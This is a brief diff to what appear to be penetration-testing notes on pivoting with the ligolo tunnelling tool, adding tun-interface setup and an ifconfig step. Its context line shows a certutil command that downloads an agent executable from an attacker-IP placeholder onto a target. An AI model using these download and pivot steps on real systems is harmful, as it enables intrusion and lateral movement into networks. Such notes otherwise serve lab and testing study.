@@ -184,6 +184,10 @@ certutil -urlcache -split -f http://<attacker-ip>/agent.exe ag.exe
 
 LOCAL
 
+ip tuntap add user kali mode tun ligolo
+
+ip link set ligolo up
+
 ./proxy -selfcert
 
 AGENT
@@ -195,6 +199,8 @@ LOCAL
 session
 
 1
+
+ifconfig
 
 OPEN NEW LOCAL SHELL
 
